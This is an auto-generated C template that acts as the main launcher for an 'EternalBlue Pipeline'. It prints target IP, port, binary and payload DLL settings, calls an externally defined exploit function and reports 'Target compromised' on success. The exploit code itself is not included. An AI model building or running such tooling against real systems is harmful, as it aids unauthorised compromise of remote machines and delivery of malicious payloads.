/* templates/eternalblue/main.c.tpl
   Gerado automaticamente. Nao edite manualmente. */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "eternalblue_config.h"

int execute_eternalblue(const char *ip, int port, const char *payload_path);

int main(void)
{
    int rc;

    printf("============================================\n");
    printf("  EternalBlue Pipeline\n");
    printf("  Target:  %s:%d\n", TARGET_IP, TARGET_PORT);
    printf("  Binary:  %s\n", TARGET_BINARY);
    printf("  DLL:     %s\n", PAYLOAD_DLL_PATH);
    printf("============================================\n\n");

    rc = execute_eternalblue(TARGET_IP, TARGET_PORT, PAYLOAD_DLL_PATH);

    if (rc == 0) {
        printf("\n[+] Pipeline complete. Target compromised.\n");
    } else {
        printf("\n[-] Pipeline failed (code %d).\n", rc);
    }

    return rc == 0 ? 0 : 1;
}